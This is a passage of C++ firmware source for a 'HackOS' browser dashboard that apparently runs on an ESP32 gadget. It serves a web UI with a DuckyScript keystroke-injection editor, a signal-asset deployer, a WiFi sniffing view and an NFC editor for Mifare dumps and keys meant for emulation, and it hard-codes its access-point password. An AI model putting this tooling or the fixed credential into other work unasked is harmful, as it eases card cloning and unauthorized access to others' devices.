/**
 * @file remote_dashboard_app.cpp
 * @brief Remote Web Dashboard App – OTA control via browser.
 *
 * Implements:
 *  - **SoftAP**: opens a dedicated WiFi access point for remote control.
 *  - **Async HTTP Server**: serves an embedded SPA dashboard from flash.
 *  - **REST API**: endpoints to query status, list apps, manage SD files,
 *    save DuckyScripts, trigger WiFi scans, and stream live RF data.
 *  - **File Download**: retrieve files from the SD card over HTTP.
 *  - **Virtual Keyboard**: compose and save DuckyScripts via the browser.
 *  - **Live RF SSE**: Server-Sent Events stream for real-time RF signal data.
 *
 * The dashboard is a self-contained SPA embedded in the firmware binary.
 * Connect to the AP and navigate to http://192.168.4.1 to open it.
 *
 * @note All communication is local-only (SoftAP, no Internet).
 */

#include "apps/remote_dashboard_app.h"

#include <cstdio>
#include <cstring>
#include <new>

#include <WiFi.h>
#include <esp_log.h>
#include <esp_wifi.h>
#include <esp_http_server.h>
#include <Arduino.h>

#include "apps/hackos_app.h"
#include "core/event.h"
#include "core/event_system.h"
#include "core/app_manager.h"
#include "core/experience_manager.h"
#include "core/plugin_manager.h"
#include "hardware/display.h"
#include "hardware/input.h"
#include "storage/vfs.h"
#include "ui/widgets.h"
#include "net/websocket_server.h"

static constexpr const char *TAG_RD = "RemoteDash";

namespace
{

// ── Tunables ──────────────────────────────────────────────────────────────────

static constexpr uint8_t AP_CHANNEL      = 1U;
static constexpr uint8_t AP_MAX_CONN     = 4U;
static constexpr size_t HTTPD_MAX_URI    = 24U;
static constexpr size_t HTTPD_STACK_SIZE = 8192U;
static constexpr size_t FILE_BUF_SIZE    = 2048U;
static constexpr size_t JSON_BUF_SIZE    = 2048U;
static constexpr size_t POST_BUF_MAX     = 4096U;
static constexpr size_t MAX_DIR_ENTRIES  = 32U;
static constexpr const char *AP_SSID     = "HackOS-Dashboard";
static constexpr const char *AP_PASS     = "hackos1337";

// ── RF SSE simulation parameters ─────────────────────────────────────────────
static constexpr int SSE_RF_SAMPLE_COUNT     = 60;
static constexpr int SSE_RF_RSSI_BASE        = -30;
static constexpr int SSE_RF_RSSI_RANGE       = 60;
static constexpr int SSE_RF_BASE_FREQ_MHZ    = 433;
static constexpr int SSE_RF_FREQ_RANGE_MHZ   = 35;
static constexpr uint32_t SSE_UPDATE_INTERVAL_MS = 500U;

// ── Menu ──────────────────────────────────────────────────────────────────────

static constexpr size_t MAIN_MENU_COUNT = 3U;
static const char *const MAIN_MENU_LABELS[MAIN_MENU_COUNT] = {
    "Start Dashboard",
    "Stop Dashboard",
    "Back",
};

// ── Embedded SPA HTML ─────────────────────────────────────────────────────────
/// Minified single-page dashboard application.

static const char DASHBOARD_HTML[] = R"rawhtml(<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>HackOS Dashboard</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:'Courier New',monospace;background:#0a0a0a;color:#00ff41;min-height:100vh}
.header{background:#111;border-bottom:1px solid #00ff41;padding:12px 16px;display:flex;justify-content:space-between;align-items:center}
.header h1{font-size:18px;text-shadow:0 0 10px #00ff41}
.header .status{font-size:12px;color:#0f0}
.nav{display:flex;gap:8px;padding:8px 16px;background:#0d0d0d;border-bottom:1px solid #1a1a1a;flex-wrap:wrap}
.nav button{background:#1a1a1a;color:#00ff41;border:1px solid #333;padding:6px 12px;cursor:pointer;font-family:inherit;font-size:12px;border-radius:3px}
.nav button:hover,.nav button.active{background:#00ff41;color:#0a0a0a}
.panel{display:none;padding:16px}
.panel.active{display:block}
.card{background:#111;border:1px solid #1a1a1a;border-radius:4px;padding:12px;margin-bottom:12px}
.card h3{color:#00ff41;margin-bottom:8px;font-size:14px}
.stat{display:inline-block;margin-right:16px;margin-bottom:4px}
.stat span{color:#0a0}
.btn{background:#00ff41;color:#0a0a0a;border:none;padding:8px 16px;cursor:pointer;font-family:inherit;font-size:12px;border-radius:3px;margin:4px}
.btn:hover{background:#00cc33}
.btn-danger{background:#ff4141;color:#fff}
.btn-danger:hover{background:#cc3333}
.file-list{list-style:none;max-height:300px;overflow-y:auto}
.file-list li{padding:6px 8px;border-bottom:1px solid #1a1a1a;display:flex;justify-content:space-between;align-items:center;font-size:13px}
.file-list li:hover{background:#1a1a1a}
.dir-entry{color:#00aaff;cursor:pointer}
textarea{width:100%;height:200px;background:#111;color:#00ff41;border:1px solid #333;padding:8px;font-family:'Courier New',monospace;font-size:13px;resize:vertical;border-radius:3px}
input[type=text]{background:#111;color:#00ff41;border:1px solid #333;padding:6px 8px;font-family:inherit;font-size:13px;border-radius:3px;width:100%;margin-bottom:8px}
.app-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(140px,1fr));gap:8px}
.app-card{background:#1a1a1a;border:1px solid #333;border-radius:4px;padding:10px;text-align:center;cursor:pointer;font-size:13px}
.app-card:hover{border-color:#00ff41;background:#111}
.rf-canvas{width:100%;height:200px;background:#111;border:1px solid #333;border-radius:4px}
.log{background:#111;color:#0f0;padding:8px;font-size:12px;max-height:150px;overflow-y:auto;border:1px solid #333;border-radius:3px;margin-top:8px;white-space:pre-wrap}
#path-bar{display:flex;align-items:center;gap:8px;margin-bottom:8px}
#path-bar span{font-size:13px;color:#0a0}
.plugin-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(260px,1fr));gap:12px}
.plugin-card{background:#111;border:1px solid #1a1a1a;border-radius:6px;padding:14px;transition:border-color .2s}
.plugin-card:hover{border-color:#00ff41}
.plugin-card h4{color:#00ff41;margin-bottom:4px;font-size:14px}
.plugin-card .meta{color:#0a0;font-size:11px;margin-bottom:6px}
.plugin-card .desc{color:#888;font-size:12px;margin-bottom:8px}
.plugin-card .actions{display:flex;gap:6px;flex-wrap:wrap}
.badge{display:inline-block;background:#1a1a1a;color:#0a0;padding:2px 8px;border-radius:10px;font-size:10px;border:1px solid #333}
.badge.on{background:#00ff4122;border-color:#00ff41;color:#00ff41}
.upload-zone{border:2px dashed #333;border-radius:6px;padding:24px;text-align:center;color:#666;cursor:pointer;transition:border-color .2s}
.upload-zone:hover,.upload-zone.dragover{border-color:#00ff41;color:#00ff41}
</style>
</head>
<body>
<div class="header">
<h1>&#x1f4bb; HackOS Dashboard</h1>
<div class="status" id="conn-status">Connecting...</div>
</div>
<div class="nav">
<button class="active" onclick="showPanel('status')">Status</button>
<button onclick="showPanel('apps')">Apps</button>
<button onclick="showPanel('files')">Files</button>
<button onclick="showPanel('ducky')">DuckyScript</button>
<button onclick="showPanel('rf')">RF Monitor</button>
<button onclick="showPanel('plugins')">Plugin Store</button>
<button onclick="showPanel('siglab')">Signal Lab</button>
<button onclick="showPanel('sigrec')">Signal Rec</button>
<button onclick="showPanel('pcap')">PCAP Live</button>
<button onclick="showPanel('nfcedit')">NFC Editor</button>
<button onclick="showPanel('term')">Terminal</button>
</div>

<div id="status" class="panel active">
<div class="card"><h3>System Status</h3><div id="sys-info">Loading...</div></div>
<div class="card"><h3>Experience</h3><div id="xp-info">Loading...</div></div>
<div class="card"><h3>Actions</h3>
<button class="btn" onclick="triggerScan()">Start WiFi Scan</button>
<div class="log" id="action-log"></div>
</div>
</div>

<div id="apps" class="panel">
<div class="card"><h3>Registered Apps</h3><div class="app-grid" id="app-grid">Loading...</div></div>
</div>

<div id="files" class="panel">
<div class="card"><h3>SD Card Browser</h3>
<div id="path-bar"><button class="btn" onclick="navigateUp()">..</button><span id="cur-path">/ext</span></div>
<ul class="file-list" id="file-list">Loading...</ul>
</div>
</div>

<div id="ducky" class="panel">
<div class="card"><h3>DuckyScript Editor</h3>
<input type="text" id="ducky-name" placeholder="Filename (e.g. payload.txt)">
<textarea id="ducky-editor" placeholder="REM My DuckyScript&#10;DELAY 1000&#10;STRING Hello World&#10;ENTER"></textarea>
<br><button class="btn" onclick="saveDucky()">Save to SD</button>
<div class="log" id="ducky-log"></div>
</div>
</div>

<div id="rf" class="panel">
<div class="card"><h3>RF Signal Monitor</h3>
<canvas class="rf-canvas" id="rf-canvas"></canvas>
<div class="log" id="rf-log">Waiting for RF data...</div>
</div>
</div>

<div id="plugins" class="panel">
<div class="card"><h3>&#128268; Plugin Store</h3>
<p style="color:#888;font-size:12px;margin-bottom:12px">Manage installed plugins and upload new ones from JSON definitions.</p>
<div class="plugin-grid" id="plugin-grid">Loading...</div>
</div>
<div class="card"><h3>Upload Plugin</h3>
<div class="upload-zone" id="upload-zone" onclick="document.getElementById('plugin-file').click()">
&#128228; Drop a .json plugin file here or click to browse
</div>
<input type="file" id="plugin-file" accept=".json" style="display:none" onchange="uploadPlugin(this)">
<div class="log" id="plugin-log"></div>
</div>
<div class="card"><h3>Create New Plugin</h3>
<input type="text" id="pname" placeholder="Plugin name (e.g. my_tool)">
<input type="text" id="plabel" placeholder="Display label (e.g. My Tool)">
<input type="text" id="pauthor" placeholder="Author">
<input type="text" id="pdesc" placeholder="Description">
<textarea id="peditor" style="height:120px" placeholder='{"actions": [{"type":"gpio_toggle","pin":25,"label":"Toggle LED"}]}'></textarea>
<button class="btn" onclick="createPlugin()">Create Plugin</button>
<div class="log" id="create-log"></div>
</div>
</div>

<div id="siglab" class="panel">
<div class="card"><h3>&#128225; Universal Signal Lab</h3>
<p style="color:#888;font-size:12px;margin-bottom:12px">Pre-loaded signal databases. Deploy IR, Sub-GHz, NFC &amp; DuckyScript assets directly to SD card.</p>
<div class="nav" style="border:none;padding:0;margin-bottom:12px">
<button class="active" onclick="filterAssets('all',this)">All</button>
<button onclick="filterAssets('ir',this)">IR Remotes</button>
<button onclick="filterAssets('subghz',this)">Sub-GHz</button>
<button onclick="filterAssets('nfc',this)">NFC</button>
<button onclick="filterAssets('ducky',this)">DuckyScript</button>
</div>
<button class="btn" onclick="deployAll()">&#128229; Deploy All to SD</button>
<button class="btn" onclick="loadAssets()">&#128260; Refresh</button>
<div class="log" id="siglab-log"></div>
<div class="plugin-grid" id="asset-grid" style="margin-top:12px">Loading...</div>
</div>
</div>

<div id="sigrec" class="panel">
<div class="card"><h3>&#128225; Live Signal Reconstructor</h3>
<p style="color:#888;font-size:12px;margin-bottom:8px">Real-time 433 MHz RAW pulse waveform via WebSocket. Use mouse wheel to zoom, click to measure pulse width.</p>
<canvas id="sig-canvas" style="width:100%;height:260px;background:#0a0a0a;border:1px solid #333;border-radius:4px;cursor:crosshair"></canvas>
<div style="display:flex;gap:12px;margin-top:8px;font-size:12px">
<span>Zoom: <span id="sig-zoom">1x</span></span>
<span>Offset: <span id="sig-offset">0</span></span>
<span>Cursor: <span id="sig-cursor">-</span></span>
<span>Pulse: <span id="sig-pulse">-</span></span>
<button class="btn" onclick="sigRecReset()">Reset View</button>
<button class="btn" onclick="sigRecPause()">Pause</button>
</div>
<div class="log" id="sig-log">Connecting to WebSocket...</div>
</div>
</div>

<div id="pcap" class="panel">
<div class="card"><h3>&#128225; Live PCAP Dashboard</h3>
<p style="color:#888;font-size:12px;margin-bottom:8px">Real-time WiFi traffic metadata. Radar view + sortable table.</p>
<div style="display:flex;gap:12px;flex-wrap:wrap">
<div style="flex:1;min-width:240px">
<canvas id="pcap-radar" style="width:100%;height:240px;background:#0a0a0a;border:1px solid #333;border-radius:4px"></canvas>
</div>
<div style="flex:2;min-width:300px;max-height:300px;overflow-y:auto">
<table style="width:100%;font-size:12px;border-collapse:collapse" id="pcap-table">
<thead><tr style="border-bottom:1px solid #333;color:#0a0">
<th style="padding:4px;cursor:pointer" onclick="pcapSort('ssid')">SSID</th>
<th style="padding:4px;cursor:pointer" onclick="pcapSort('rssi')">RSSI</th>
<th style="padding:4px;cursor:pointer" onclick="pcapSort('ch')">Ch</th>
<th style="padding:4px;cursor:pointer" onclick="pcapSort('enc')">Enc</th>
</tr></thead>
<tbody id="pcap-body"></tbody>
</table>
</div>
</div>
<div class="log" id="pcap-log">Waiting for PCAP data...</div>
</div>
</div>

<div id="nfcedit" class="panel">
<div class="card"><h3>&#128179; NFC Hex Editor</h3>
<p style="color:#888;font-size:12px;margin-bottom:8px">Read Mifare dumps from SD, edit sectors/keys, save back for emulation.</p>
<div style="display:flex;gap:8px;margin-bottom:8px;flex-wrap:wrap">
<input type="text" id="nfc-path" placeholder="/ext/nfc/dump.bin" style="flex:1;min-width:200px">
<button class="btn" onclick="nfcLoad()">Load from SD</button>
<button class="btn" onclick="nfcSave()">Save to SD</button>
</div>
<div id="nfc-sectors" style="font-family:'Courier New',monospace;font-size:11px;max-height:400px;overflow-y:auto"></div>
<div class="log" id="nfc-log"></div>
</div>
</div>

<div id="term" class="panel">
<div class="card"><h3>&#128187; Remote Terminal</h3>
<p style="color:#888;font-size:12px;margin-bottom:8px">Web-to-Serial bridge. Send commands to AppManager as if pressing physical buttons.</p>
<div id="term-output" style="background:#0a0a0a;color:#00ff41;font-family:'Courier New',monospace;font-size:12px;height:300px;overflow-y:auto;padding:8px;border:1px solid #333;border-radius:4px;white-space:pre-wrap"></div>
<div style="display:flex;gap:8px;margin-top:8px">
<input type="text" id="term-input" placeholder="Type command..." style="flex:1" onkeydown="if(event.key==='Enter')termSend()">
<button class="btn" onclick="termSend()">Send</button>
</div>
<div style="display:flex;gap:4px;margin-top:8px;flex-wrap:wrap">
<button class="btn" onclick="termBtn('up')">&#9650; UP</button>
<button class="btn" onclick="termBtn('down')">&#9660; DOWN</button>
<button class="btn" onclick="termBtn('left')">&#9664; LEFT</button>
<button class="btn" onclick="termBtn('right')">&#9654; RIGHT</button>
<button class="btn" onclick="termBtn('press')">&#9679; PRESS</button>
<button class="btn" onclick="termBtn('back')">&#8592; BACK</button>
</div>
</div>
</div>

<script>
let curPath='/ext';
function api(u,o){return fetch(u,o).then(r=>r.json()).catch(e=>({error:e.message}))}
function showPanel(id){
document.querySelectorAll('.panel').forEach(p=>p.classList.remove('active'));
document.querySelectorAll('.nav button').forEach(b=>b.classList.remove('active'));
document.getElementById(id).classList.add('active');
event.target.classList.add('active');
if(id==='status')loadStatus();
if(id==='apps')loadApps();
if(id==='files')loadFiles();
if(id==='rf')startRF();
if(id==='plugins')loadPlugins();
if(id==='siglab')loadAssets();
if(id==='sigrec')initSigRec();
if(id==='pcap')initPcap();
if(id==='term')initTerm();
}
function loadStatus(){
api('/api/status').then(d=>{
if(d.error)return;
document.getElementById('sys-info').innerHTML=
'<div class="stat">Heap: <span>'+d.free_heap+'</span> free</div>'+
'<div class="stat">Total: <span>'+d.total_heap+'</span></div>'+
'<div class="stat">Used: <span>'+d.heap_usage_pct+'%</span></div>'+
'<div class="stat">Apps: <span>'+d.app_count+'</span></div>'+
'<div class="stat">Uptime: <span>'+Math.floor(d.uptime_ms/1000)+'s</span></div>';
document.getElementById('conn-status').textContent='Connected';
});
api('/api/xp').then(d=>{
if(d.error)return;
document.getElementById('xp-info').innerHTML=
'<div class="stat">Level: <span>'+d.level+'</span></div>'+
'<div class="stat">XP: <span>'+d.xp+'/'+d.xp_next+'</span></div>'+
'<div class="stat">Hack-Points: <span>'+d.hack_points+'</span></div>';
});
}
function loadApps(){
api('/api/apps').then(d=>{
if(d.error||!d.apps)return;
let h='';
d.apps.forEach(a=>{h+='<div class="app-card" onclick="launchApp(\''+a+'\')">'+a+'</div>';});
document.getElementById('app-grid').innerHTML=h;
});
}
function launchApp(n){
api('/api/apps/launch',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({name:n})}).then(d=>{
let lg=document.getElementById('action-log');
lg.textContent+='> Launch '+n+': '+(d.ok?'OK':d.error)+'\n';
});
}
function loadFiles(){
api('/api/files?path='+encodeURIComponent(curPath)).then(d=>{
if(d.error){document.getElementById('file-list').innerHTML='<li>Error</li>';return;}
document.getElementById('cur-path').textContent=curPath;
let h='';
if(!d.entries||d.entries.length===0){h='<li>Empty</li>';}
else d.entries.forEach(e=>{
if(e.is_dir)h+='<li><span class="dir-entry" onclick="navDir(\''+e.name+'\')">&#128193; '+e.name+'</span></li>';
else h+='<li><span>&#128196; '+e.name+' ('+e.size+'B)</span><button class="btn" onclick="dlFile(\''+e.name+'\')">DL</button></li>';
});
document.getElementById('file-list').innerHTML=h;
});
}
function navDir(n){curPath+='/'+n;loadFiles();}
function navigateUp(){let i=curPath.lastIndexOf('/');if(i>0)curPath=curPath.substring(0,i);if(curPath.length<4)curPath='/ext';loadFiles();}
function dlFile(n){window.open('/api/files/download?path='+encodeURIComponent(curPath+'/'+n),'_blank');}
function triggerScan(){
api('/api/wifi/scan',{method:'POST'}).then(d=>{
let lg=document.getElementById('action-log');
lg.textContent+='> WiFi Scan: '+(d.ok?'started':d.error)+'\n';
});
}
function saveDucky(){
let name=document.getElementById('ducky-name').value.trim();
let code=document.getElementById('ducky-editor').value;
if(!name){document.getElementById('ducky-log').textContent='Error: filename required';return;}
api('/api/ducky/save',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({filename:name,content:code})}).then(d=>{
document.getElementById('ducky-log').textContent=d.ok?'Saved to /ext/badbt/'+name:'Error: '+(d.error||'unknown');
});
}
let rfEvt=null;
function startRF(){
if(rfEvt)rfEvt.close();
let lg=document.getElementById('rf-log');
let canvas=document.getElementById('rf-canvas');
let ctx=canvas.getContext('2d');
canvas.width=canvas.clientWidth;canvas.height=canvas.clientHeight;
let data=[];
rfEvt=new EventSource('/api/rf/live');
rfEvt.onmessage=function(e){
let v=JSON.parse(e.data);
lg.textContent='RSSI: '+v.rssi+' dBm | Freq: '+v.freq+' MHz | Proto: '+v.proto;
data.push(v.rssi);if(data.length>canvas.width)data.shift();
ctx.fillStyle='#111';ctx.fillRect(0,0,canvas.width,canvas.height);
ctx.strokeStyle='#00ff41';ctx.lineWidth=1;ctx.beginPath();
for(let i=0;i<data.length;i++){let y=canvas.height-((data[i]+120)/120)*canvas.height;if(i===0)ctx.moveTo(i,y);else ctx.lineTo(i,y);}
ctx.stroke();
};
rfEvt.onerror=function(){lg.textContent+='\\nSSE disconnected';};
}
function loadPlugins(){
api('/api/plugins').then(d=>{
if(d.error||!d.plugins){document.getElementById('plugin-grid').innerHTML='<p>No plugins installed</p>';return;}
let h='';
d.plugins.forEach(p=>{
h+='<div class="plugin-card"><h4>'+esc(p.label)+'</h4>';
h+='<div class="meta">v'+esc(p.version)+' by '+esc(p.author)+' <span class="badge'+(p.enabled?' on':'')+'">'+(p.enabled?'Enabled':'Disabled')+'</span></div>';
h+='<div class="desc">'+esc(p.description)+'</div>';
h+='<div class="actions">';
h+='<button class="btn" onclick="togglePlugin(\''+esc(p.name)+'\','+(!p.enabled)+')">'+(p.enabled?'Disable':'Enable')+'</button>';
h+='<button class="btn btn-danger" onclick="deletePlugin(\''+esc(p.name)+'\')">Delete</button>';
if(p.actions)h+='<span class="badge">'+p.actions+' actions</span>';
h+='</div></div>';
});
document.getElementById('plugin-grid').innerHTML=h;
});
}
function esc(s){let d=document.createElement('div');d.textContent=s;return d.innerHTML.replace(/'/g,'&#39;').replace(/"/g,'&quot;');}
function togglePlugin(n,en){
api('/api/plugins/toggle',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({name:n,enabled:en})}).then(d=>{
document.getElementById('plugin-log').textContent=d.ok?'Plugin '+(en?'enabled':'disabled'):'Error: '+(d.error||'unknown');
loadPlugins();
});
}
function deletePlugin(n){
if(!confirm('Delete plugin "'+n+'"?'))return;
api('/api/plugins/delete',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({name:n})}).then(d=>{
document.getElementById('plugin-log').textContent=d.ok?'Plugin deleted':'Error: '+(d.error||'unknown');
loadPlugins();
});
}
function uploadPlugin(input){
if(!input.files||!input.files[0])return;
let f=input.files[0];
let reader=new FileReader();
reader.onload=function(e){
let content=e.target.result;
try{JSON.parse(content);}catch(err){document.getElementById('plugin-log').textContent='Invalid JSON: '+err.message;return;}
api('/api/plugins/upload',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({filename:f.name,content:content})}).then(d=>{
document.getElementById('plugin-log').textContent=d.ok?'Plugin uploaded! Reload to activate.':'Error: '+(d.error||'unknown');
loadPlugins();
});
};
reader.readAsText(f);
input.value='';
}
function createPlugin(){
let name=document.getElementById('pname').value.trim();
let label=document.getElementById('plabel').value.trim()||name;
let author=document.getElementById('pauthor').value.trim()||'Community';
let desc=document.getElementById('pdesc').value.trim()||'Custom plugin';
let extra=document.getElementById('peditor').value.trim();
if(!name){document.getElementById('create-log').textContent='Name is required';return;}
let plugin={name:name,label:label,version:'1.0.0',author:author,description:desc,actions:[]};
if(extra){try{let e=JSON.parse(extra);if(e.actions)plugin.actions=e.actions;if(e.config)plugin.config=e.config;}catch(err){document.getElementById('create-log').textContent='Invalid JSON in extra: '+err.message;return;}}
let content=JSON.stringify(plugin,null,2);
let filename=name.replace(/[^a-zA-Z0-9_-]/g,'_')+'.json';
api('/api/plugins/upload',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({filename:filename,content:content})}).then(d=>{
document.getElementById('create-log').textContent=d.ok?'Plugin "'+name+'" created!':'Error: '+(d.error||'unknown');
loadPlugins();
});
}
let uz=document.getElementById('upload-zone');
if(uz){uz.ondragover=function(e){e.preventDefault();uz.classList.add('dragover');};uz.ondragleave=function(){uz.classList.remove('dragover');};uz.ondrop=function(e){e.preventDefault();uz.classList.remove('dragover');if(e.dataTransfer.files[0]){let fi=document.getElementById('plugin-file');fi.files=e.dataTransfer.files;uploadPlugin(fi);}};}
let slFilter='all',slAssets=[];
function loadAssets(){
api('/api/assets').then(d=>{
if(d.error||!d.assets){document.getElementById('asset-grid').innerHTML='<p>No assets available</p>';return;}
slAssets=d.assets;renderAssets();
});
}
function renderAssets(){
let h='',list=slFilter==='all'?slAssets:slAssets.filter(a=>a.category===slFilter);
if(!list.length){document.getElementById('asset-grid').innerHTML='<p>No assets in this category</p>';return;}
list.forEach(a=>{
let catColors={ir:'#ff6641',subghz:'#41a0ff',nfc:'#ff41d0',ducky:'#ffcc41'};
let catLabels={ir:'IR Remote',subghz:'Sub-GHz',nfc:'NFC',ducky:'DuckyScript'};
h+='<div class="plugin-card"><h4>'+esc(a.name)+'</h4>';
h+='<div class="meta"><span class="badge" style="border-color:'+catColors[a.category]+';color:'+catColors[a.category]+'">'+catLabels[a.category]+'</span> '+esc(a.filename)+'</div>';
h+='<div class="desc">'+esc(a.desc)+'</div>';
h+='<div class="actions"><button class="btn" onclick="deployAsset(\''+esc(a.id)+'\')">&#128229; Deploy to SD</button></div></div>';
});
document.getElementById('asset-grid').innerHTML=h;
}
function filterAssets(cat,btn){
slFilter=cat;
if(btn){btn.parentElement.querySelectorAll('button').forEach(b=>b.classList.remove('active'));btn.classList.add('active');}
renderAssets();
}
function deployAsset(id){
let lg=document.getElementById('siglab-log');
lg.textContent='Deploying '+id+'...';
api('/api/assets/deploy',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({id:id})}).then(d=>{
lg.textContent=d.ok?'Deployed: '+d.path:'Error: '+(d.error||'unknown');
});
}
function deployAll(){
let lg=document.getElementById('siglab-log');
let list=slFilter==='all'?slAssets:slAssets.filter(a=>a.category===slFilter);
if(!list.length){lg.textContent='No assets to deploy';return;}
lg.textContent='Deploying '+list.length+' assets...';
let done=0,fail=0;
list.forEach(a=>{
api('/api/assets/deploy',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({id:a.id})}).then(d=>{
if(d.ok)done++;else fail++;
if(done+fail===list.length)lg.textContent='Deployed: '+done+' OK, '+fail+' failed';
});
});
}
/* ── Live Signal Reconstructor ─────────────────────────────────────────── */
let sigWs=null,sigData=[],sigZoom=1,sigOffX=0,sigPaused=false,sigMark=-1;
function initSigRec(){
if(sigWs&&sigWs.readyState<=1)return;
let lg=document.getElementById('sig-log');
let c=document.getElementById('sig-canvas');
c.width=c.clientWidth;c.height=c.clientHeight;
let ctx=c.getContext('2d');
sigWs=new WebSocket('ws://'+location.host+'/ws');
sigWs.onopen=function(){lg.textContent='WebSocket connected';};
sigWs.onmessage=function(e){
if(sigPaused)return;
try{let m=JSON.parse(e.data);if(m.type==='rf_pulse'&&m.pulses){m.pulses.forEach(function(p){sigData.push(p);});if(sigData.length>8000)sigData=sigData.slice(-8000);drawSig(ctx,c);}}catch(err){}
};
sigWs.onerror=function(){lg.textContent='WS error';};
sigWs.onclose=function(){lg.textContent='WS closed';};
c.onwheel=function(e){e.preventDefault();sigZoom=Math.max(0.1,Math.min(50,sigZoom*(e.deltaY<0?1.2:0.83)));document.getElementById('sig-zoom').textContent=sigZoom.toFixed(1)+'x';drawSig(ctx,c);};
c.onmousemove=function(e){let r=c.getBoundingClientRect();let x=Math.floor((e.clientX-r.left)/r.width*c.width);document.getElementById('sig-cursor').textContent=x+'px';if(sigMark>=0){let pw=Math.abs(x-sigMark);document.getElementById('sig-pulse').textContent=pw+'px / ~'+(pw/sigZoom).toFixed(0)+'us';}};
c.onclick=function(e){let r=c.getBoundingClientRect();sigMark=Math.floor((e.clientX-r.left)/r.width*c.width);};
}
function drawSig(ctx,c){
ctx.fillStyle='#0a0a0a';ctx.fillRect(0,0,c.width,c.height);
if(!sigData.length)return;
let mid=c.height/2;
ctx.strokeStyle='#333';ctx.beginPath();ctx.moveTo(0,mid);ctx.lineTo(c.width,mid);ctx.stroke();
ctx.strokeStyle='#00ff41';ctx.lineWidth=1;ctx.beginPath();
let x=0,high=false;
let start=Math.max(0,sigData.length-Math.floor(c.width/sigZoom)+sigOffX);
for(let i=start;i<sigData.length&&x<c.width;i++){
let w=Math.max(1,sigData[i]*sigZoom/100);
let y=high?mid-mid*0.7:mid+mid*0.7;
if(i===start)ctx.moveTo(x,y);
ctx.lineTo(x,y);x+=w;ctx.lineTo(x,y);
high=!high;
}
ctx.stroke();
if(sigMark>=0){ctx.strokeStyle='#ff4141';ctx.beginPath();ctx.moveTo(sigMark,0);ctx.lineTo(sigMark,c.height);ctx.stroke();}
document.getElementById('sig-offset').textContent=sigOffX;
}
function sigRecReset(){sigZoom=1;sigOffX=0;sigMark=-1;document.getElementById('sig-zoom').textContent='1x';let c=document.getElementById('sig-canvas');drawSig(c.getContext('2d'),c);}
function sigRecPause(){sigPaused=!sigPaused;event.target.textContent=sigPaused?'Resume':'Pause';}
/* ── PCAP Dashboard ────────────────────────────────────────────────────── */
let pcapWs=null,pcapEntries=[];
function initPcap(){
if(pcapWs&&pcapWs.readyState<=1)return;
let lg=document.getElementById('pcap-log');
pcapWs=new WebSocket('ws://'+location.host+'/ws');
pcapWs.onopen=function(){lg.textContent='PCAP WebSocket connected';};
pcapWs.onmessage=function(e){
try{let m=JSON.parse(e.data);if(m.type==='wifi_pkt'){
let idx=pcapEntries.findIndex(function(p){return p.ssid===m.ssid;});
if(idx>=0){pcapEntries[idx].rssi=m.rssi;pcapEntries[idx].ch=m.ch;pcapEntries[idx].enc=m.enc;pcapEntries[idx].ts=Date.now();}
else{pcapEntries.push({ssid:m.ssid,rssi:m.rssi,ch:m.ch,enc:m.enc,ts:Date.now()});if(pcapEntries.length>50)pcapEntries.shift();}
renderPcapTable();drawPcapRadar();
}}catch(err){}
};
pcapWs.onerror=function(){lg.textContent='WS error';};
}
function renderPcapTable(){
let tb=document.getElementById('pcap-body');let h='';
pcapEntries.forEach(function(p){h+='<tr style="border-bottom:1px solid #1a1a1a"><td style="padding:4px">'+esc(p.ssid)+'</td><td style="padding:4px">'+p.rssi+'</td><td style="padding:4px">'+p.ch+'</td><td style="padding:4px">'+esc(p.enc)+'</td></tr>';});
tb.innerHTML=h;
}
let pcapSortKey='rssi';
function pcapSort(k){pcapSortKey=k;pcapEntries.sort(function(a,b){return a[k]>b[k]?-1:1;});renderPcapTable();}
function drawPcapRadar(){
let c=document.getElementById('pcap-radar');let ctx=c.getContext('2d');
c.width=c.clientWidth;c.height=c.clientHeight;
let cx=c.width/2,cy=c.height/2,mr=Math.min(cx,cy)-10;
ctx.fillStyle='#0a0a0a';ctx.fillRect(0,0,c.width,c.height);
ctx.strokeStyle='#1a1a1a';
for(let r=1;r<=3;r++){ctx.beginPath();ctx.arc(cx,cy,mr*r/3,0,Math.PI*2);ctx.stroke();}
pcapEntries.forEach(function(p){
let dist=Math.max(0.05,1-(-p.rssi)/100)*mr;
let angle=(p.ch/14)*Math.PI*2;
let px=cx+Math.cos(angle)*dist,py=cy+Math.sin(angle)*dist;
ctx.fillStyle='#00ff41';ctx.beginPath();ctx.arc(px,py,4,0,Math.PI*2);ctx.fill();
ctx.fillStyle='#0a0';ctx.font='9px monospace';ctx.fillText(p.ssid.substring(0,8),px+6,py+3);
});
}
/* ── NFC Hex Editor ────────────────────────────────────────────────────── */
let nfcDump=null;
function nfcLoad(){
let path=document.getElementById('nfc-path').value.trim();
if(!path){document.getElementById('nfc-log').textContent='Enter a file path';return;}
api('/api/files/download?path='+encodeURIComponent(path)).then(function(r){return r;}).catch(function(){});
fetch('/api/files/download?path='+encodeURIComponent(path)).then(function(r){return r.arrayBuffer();}).then(function(ab){
nfcDump=new Uint8Array(ab);renderNfcHex();
document.getElementById('nfc-log').textContent='Loaded '+nfcDump.length+' bytes from '+path;
}).catch(function(e){document.getElementById('nfc-log').textContent='Load error: '+e.message;});
}
function renderNfcHex(){
if(!nfcDump)return;
let el=document.getElementById('nfc-sectors');let h='';
let sectors=Math.ceil(nfcDump.length/64);
for(let s=0;s<sectors;s++){
h+='<div style="margin-bottom:8px;border:1px solid #1a1a1a;padding:6px;border-radius:4px">';
h+='<div style="color:#00ff41;margin-bottom:4px">Sector '+s+'</div>';
for(let b=0;b<4;b++){
let off=s*64+b*16;if(off>=nfcDump.length)break;
h+='<div style="display:flex;gap:4px;align-items:center"><span style="color:#666;width:40px">'+off.toString(16).padStart(4,'0')+'</span>';
for(let i=0;i<16&&(off+i)<nfcDump.length;i++){
